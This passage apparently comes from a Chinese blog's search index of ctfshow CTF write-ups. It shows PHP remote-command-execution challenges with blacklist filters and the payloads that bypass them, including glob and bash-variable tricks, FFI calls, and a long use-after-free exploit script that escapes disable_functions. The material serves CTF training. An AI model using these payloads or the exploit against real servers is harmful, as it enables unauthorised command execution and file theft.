|[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 先改名为a.txt： http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/?c=mv${IFS}fl??.???${IFS}a.txt 然后直接访问 http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/a.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:21","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web54"},{"categories":["CTF","web"],"content":"\r[web55] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 20:03:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 无字母RCE 由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。 ?c=/bin/base64 flag.php http://09b4ab86-9c0f-4b01-ab1b-c62620f27051.challenge.ctf.show/?c=/???/????64 ????.??? 复制出来base64解码 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:22","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web55"},{"categories":["CTF","web"],"content":"\r[web56] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 过滤了所有的字母和数字，以及一系列的符号。 本题最值得推敲的点就是无字母数字的命令执行 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 我们上传到Linux系统中的文件，都会被存放到/tmp目录下，并且传入生成的临时文件，只有传入的php文件中含有大写字母，且默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，而且可以发现，只有PHP生成的临时文件包含大写字母，因此可以使用方法来选择传入的php文件/???/???[@-[] 从ascii码表可以看出，大写字母是被@和[两个字符所包围的，因此[@-[]可以用来表示所有的大写字母。 看了许多关于本题的博客，发现解题方法不外乎通过构造一个html poc： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ePOST数据包POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://d06e4766-59a3-43fc-af3b-6dd6f1fd84a3.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003c!--链接是当前打开的题目链接--\u003e \u003clabel for=\"file\"\u003e文件名：\u003c/label\u003e \u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\u003cbr\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"提交\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 通过phpstudy搭建本地环境，我把它命名为test.html 然后进入http://127.0.0.1/test.html 通过该页面实现对题目的文件上传 在需要上传的php文件中写入 #!/bin/sh ls 上传的同时开启抓包拦截，修改get传参部分 ?c=.%20/???/????????[@-[] 并发送到repeater 可以直接在repeater中修改所上传的文件内容，来获取flag ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:23","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web56"},{"categories":["CTF","web"],"content":"\r[web57] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-08 01:02:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 还能炫的动吗？ //flag in 36.php if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\\u003e|\\\u003c|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\", $c)){ system(\"cat \".$c.\".php\"); } }else{ highlight_file(__FILE__); } 题目中已经提示flag在36.php中了，根据题目可知，我们只需要绕过过滤传参36即可 python脚本： data = \"$((~$((\"+\"$((~$(())))\"*37+\"))))\" print(data) $((\"\"))值为0,$((~$((\"\"))))值为-1 注意的是：${_}会输出上一次的执行结果 payload: http://cdc732c6-8cd0-470d-9010-35488663232b.challenge.ctf.show/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 传参之后页面是没有回显的，按ctrl+u查看源码可得到： ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:24","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web57"},{"categories":["CTF","web"],"content":"\r[web58] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); }else{ highlight_file(__FILE__); } 直接用system()函数发现被禁了 可以用file_get_contents payload:(POST传参) c=echo file_get_contents(\"flag.php\"); (记得查看网站源码来获取flag) web59/60/61/62/63/64/65/67 要注意有些题目的flag文件在根目录，有些是在网站目录 payload： c=echo file_get_contents(\"flag.php\"); c=readfile(\"flag.php\"); c=var_dump(file('flag.php')); c=highlight_file(\"flag.php\"); c=show_source(\"flag.php\"); c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgets($a);echo $line;}#一行一行读取 c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgetc($a);echo $line;}#一行一个一个字符取 c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);} https://blog.csdn.net/m0_62207170/article/details/129902182 [web59]跟58一模一样的题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:25","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web58"},{"categories":["CTF","web"],"content":"\r[web66] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); }else{ highlight_file(__FILE__); } 前端显示出来的代码长得跟前面一样，但过滤了很多函数，尝试了前面的payload都行不通 先查看根目录内容 c=print_r(scandir(\"/\")); 或者可以用 c=var_dump(scandir('/')); 可以看到根目录下的flag.txt文件，随后 c=highlight_file(\"/flag.txt\"); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:26","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web66"},{"categories":["CTF","web"],"content":"\r[web68]\r直接禁用了highlight_file函数，显示根目录文件 c=var_dump(scandir('/')); 然后直接 c=include('/flag.txt'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:27","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web68"},{"categories":["CTF","web"],"content":"\r[web69]尝试c=include('index.php');发现字节太大了 直接尝试include flag.txt，成功了 c=include('/flag.txt'); web70类似 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:28","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web69"},{"categories":["CTF","web"],"content":"\r[web71] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set('display_errors', 0); // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s); }else{ highlight_file(__FILE__); } ?\u003e 你要上天吗？ 源码劫持了输出缓冲并且将数字和字母替换成了? ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 题解1： 在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有： ob_flush(); ob_end_flush(); payload： c=include('/flag.txt');ob_flush(); 题解2： 提前终止程序，即执行完代码直接退出，可以调用的函数有： exit(); die(); payload： c=include('/flag.txt');exit(); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:29","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web71"},{"categories":["CTF","web"],"content":"\r[web72] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set('display_errors', 0); // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s); }else{ highlight_file(__FILE__); } ?\u003e 你要上天吗？ 查看源代码， 用glob协议读取根目录 c=?\u003e\u003c?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f-\u003e__toString().' '); } exit(0); ?\u003e 用uaf脚本命令执行,并url编码： c=function ctfshow($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u003ea); $backtrace = (new Exception)-\u003egetTrace(); if(!isset($backtrace[1]['args'])) { $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u003e= 0; $j--) { $address \u003c\u003c= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i \u003c $m; $i++) { $out .= sprintf(\"%c\",($ptr \u0026 0xff)); $ptr \u003e\u003e= 8; } return $out; } function write(\u0026$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u003c $n; $i++) { $str[$p + $i] = sprintf(\"%c\",($v \u0026 0xff)); $v \u003e\u003e= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u003ea); if($s != 8) { $leak %= 2 \u003c\u003c ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u003c $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026\u0026 $p_flags == 6) { $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026\u0026 $p_flags == 5) { $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u003c $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026 0xfffffffffffff000; for($i = 0; $i \u003c 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); $vuln = new Vuln(); $vuln-\u003ea = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; $contiguous = []; for($i = 0; $i \u003c $n_alloc; $i++) $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-\u003eb = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2","date":"2023-11-17","objectID":"/ctfshow_rce/:22:30","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web72"},{"categories":["CTF","web"],"content":"\r[web73]先读取目录： c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-\u003e__toString().\" \");};exit(); 发现flagc.txt文件 发现可以直接include: c=include('/flagc.txt');exit(); web74是相同的套路 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:31","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web73"},{"categories":["CTF","web"],"content":"\r[web75]读取目录： c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-\u003e__toString().\" \");};exit(); 然后发现无法直接include，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下： c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');foreach($dbh-\u003equery('select load_file(\"/flag36.txt\")') as $row) {echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e- \u003egetMessage();exit(0);}exit(0); web76是同样的套路 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:32","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web75"},{"categories":["CTF","web"],"content":"\r[web77]读取目录发现flag36x.txt和readflag 前面的套路失效了，根据提示使用PHP7.4以上才有的FFI进行命令执行 FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 payload： c=$ffi = FFI::cdef(\"int system(const char *command);\"); $a='/readflag \u003e 1.txt'; $ffi-\u003esystem($a); 随后我们访问1.txt即可得到flag ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:33","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web77"},{"categories":["CTF","web"],"content":"\r[web118] \u003c!DOCTYPE html\u003e \u003chtml lang=\"zh-cn\"\u003e \u003cbody\u003e \u003cdiv style=\"width:400px;height:10px;margin:100px auto\"\u003e \u003cform action='' method=post\u003e \u003cinput type='text' name='code' placeholder=\"给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 \"\u003e \u003c/form\u003e \u003c!-- system($code);--\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 题目的描述告诉我们flag在flag.php里面 题目环境的前端提示我们输入的命令会被执行，但经过尝试ls等命令是被ban掉的 bash的内置变量进行绕过 $PWD用法： $PWD和${PWD} /var/www/html 结果一样 ${#PWD} 13 $PWD的长度 ${PWD:3} r/www/html ${PWD:~3} html ${PWD:3:1} r ${PWD:~3:1} h ${SHLVL:~A} 1 A是字符串 转换为数字相当于0 拼接出nl： n: ${PATH:~A} n #如果$PATH结尾为n ${PATH:${#TERM}:${SHLVL:~A}} # n 相当于${PATH:14:1} l: ${#RANDOM} # 4或者5 ${PATH:${#RANDOM}:${#SHLVL:~A}} #l https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd 构造payload： ${PATH:~A}${PWD:~A}$IFS????.??? //也就是 nl flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:34","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web118"},{"categories":["CTF","web"],"content":"\r[web119]跟上题一样，不过PATH被ban了。 SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。 ${SHLVL} //一般是一个个位数 ${#SHLVL} //1，表示结果的字符长度 ${PWD:${#}:${#SHLVL}} //表示/ ${USER} //www-data ${PHP_VERSION:~A} //2 ${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} //at ${PHP_VERSION:~A}来自于返回报文的头部，为2： payload： ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.??? //也就是：/???/?at ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:35","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web119"},{"categories":["CTF","web"],"content":"\r[web120] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u003c|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e 限制的$code的长度 把${#}省略 payload: code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.??? 也可以用/bin/base64 flag.php 即payload：($RANDOM 的范围是 [0, 32767]) code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:36","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web120"},{"categories":["CTF","web"],"content":"\r[web121] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u003c|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e rev命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。 尝试构造命令：/bin/rev flag.php ${#IFS}在ubuntu等系统中值为3，在kali中测试值为4 ${#}为添加到shell的参数个数，${##}则为值1 payload： code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.??? 得到的flag值放在Linux里面rev一下就可以了 另外 $?表示上次命令的执行返回码，0表示正常，其他都是不正常。 所以我们可以有如下payload： code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:37","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web121"},{"categories":["CTF","web"],"content":"\r[web122] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e 比121又过滤了PWD和$ 利用\u003cA的报错就能返回值1。 这一题借用${HOME}的第一位为/：payload： code=\u003cA;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.??? （多执行几次） ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:38","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web122"},{"categories":["CTF","web"],"content":"\r[web124] \u003c?php /* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 */ error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 当前目录下的文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls 读取文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php 解析$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 $var{func} 这种形式，其中 $var 是一个字符串，{func} 表示函数名。否则，如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造 $pi{abs}($pi{acos});\u0026abs=system\u0026acos=ls $pi{abs}($pi{acos});\u0026abs=system\u0026acos=tac flag.php 因为$pi 是一个字符串，而不是一个函数。$pi 的值是通过将 37907361743 和 1598506324 作为参数传递给 base_convert 和 dechex 函数计算得到的字符串。因此，如果直接使用 $pi{abs}($pi{acos})，PHP 引擎将无法识别 $pi 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，$$pi{abs} 将 $pi{abs} 解释为一个变量名，然后使用 $pi{acos} 作为该变量名的值进行函数调用。因此，$$pi{abs}($$pi{acos}) 将会调用 $pi{abs}($pi{acos})。 所以要构造 $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:39","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web124"},{"categories":["CTF","web"],"content":"\r[web124] \u003c?php /* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 */ error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 当前目录下的文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls 读取文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php 解析$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 $var{func} 这种形式，其中 $var 是一个字符串，{func} 表示函数名。否则，如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造 $pi{abs}($pi{acos});\u0026abs=system\u0026acos=ls $pi{abs}($pi{acos});\u0026abs=system\u0026acos=tac flag.php 因为$pi 是一个字符串，而不是一个函数。$pi 的值是通过将 37907361743 和 1598506324 作为参数传递给 base_convert 和 dechex 函数计算得到的字符串。因此，如果直接使用 $pi{abs}($pi{acos})，PHP 引擎将无法识别 $pi 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，$$pi{abs} 将 $pi{abs} 解释为一个变量名，然后使用 $pi{acos} 作为该变量名的值进行函数调用。因此，$$pi{abs}($$pi{acos}) 将会调用 $pi{abs}($pi{acos})。 所以要构造 $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:39","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#解析"},{"categories":["CTF","web"],"content":"ctfshow xxe漏洞专题 